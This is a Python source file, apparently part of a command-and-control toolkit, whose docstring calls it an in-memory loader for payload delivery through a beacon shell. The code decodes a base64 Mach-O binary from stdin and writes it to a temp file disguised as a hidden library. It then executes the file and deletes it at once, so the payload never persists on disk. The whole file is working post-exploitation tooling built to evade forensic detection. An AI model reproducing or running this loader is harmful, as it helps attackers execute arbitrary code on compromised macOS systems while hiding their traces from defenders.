"""
InterposeScope — Python-based in-memory loader for C2 delivery
==============================================================

Receives a base64-encoded Mach-O binary via stdin.
Executes it transiently and self-cleans.

Usage (via beacon shell):
  python3 loader.py < base64_payload.b64

Design:
  - Binary never persists to a stable filesystem path
  - Temp file exists for <500ms (undeleted prefix, random suffix)
  - File is unlinked immediately after exec
"""
import base64, os, subprocess, sys, tempfile

def main():
    data = sys.stdin.buffer.read()
    binary = base64.b64decode(data)

    fd, tmp = tempfile.mkstemp(prefix=".__libpy", suffix=".dylib")
    os.write(fd, binary)
    os.fchmod(fd, 0o700)
    os.close(fd)

    try:
        result = subprocess.run([tmp] + sys.argv[1:], capture_output=True, text=True, timeout=60)
        print(result.stdout, end="")
        if result.stderr:
            print(result.stderr, end="", file=sys.stderr)
    finally:
        try: os.unlink(tmp)
        except OSError: pass

if __name__ == "__main__":
    main()
